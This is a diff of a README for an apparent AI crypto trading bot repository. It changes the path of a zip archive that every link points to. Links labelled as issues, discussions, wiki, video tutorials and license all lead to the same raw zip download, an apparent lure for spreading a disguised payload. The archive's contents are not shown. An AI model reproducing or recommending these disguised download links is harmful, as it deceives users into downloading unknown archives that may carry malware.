@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Crypto-Trading-Bot - Your Easy Way to Trade Crypto
 
-[![Download Latest Release](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the AI-Powered Crypto Trading Bot! This tool helps you trade cryptocu
 
 1. **Visit the Download Page**: Click on the link below to get the latest version of the AI-Powered Crypto Trading Bot.
    
-   [Download Latest Release](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip)
 
 2. **Choose the Right Version**: On the release page, you will see several files. Look for the file labeled with the latest version number. This is the version you'll want to install.
 
@@ -57,13 +57,13 @@ If you encounter issues while using the AI-Powered Crypto Trading Bot:
 
 For additional support or to connect with other users, join our community:
 
-- **GitHub Issues**: Report bugs or ask questions in the [Issues section](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip).
-- **Discussions**: Share tips and strategies in the [Discussions section](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip).
+- **GitHub Issues**: Report bugs or ask questions in the [Issues section](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip).
+- **Discussions**: Share tips and strategies in the [Discussions section](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip).
 
 ## 🔗 Additional Resources
 
-- **Documentation**: Explore our [wiki](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip) for detailed guides and FAQs.
-- **Video Tutorials**: Watch [tutorial videos](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip) to see the bot in action and learn how to maximize its features.
+- **Documentation**: Explore our [wiki](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip) for detailed guides and FAQs.
+- **Video Tutorials**: Watch [tutorial videos](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip) to see the bot in action and learn how to maximize its features.
 
 ## ⭐ Acknowledgments
 
@@ -71,6 +71,6 @@ We appreciate all users who have provided feedback and contributed to this proje
 
 ## 📌 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/myriagram/AI-Powered-Crypto-Trading-Bot.zip) file for details. 
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/opop753/AI-Powered-Crypto-Trading-Bot/master/bot/strategies/A-Bot-Trading-Crypto-Powered-2.6.zip) file for details. 
 
 Thank you for choosing our bot to elevate your crypto trading!
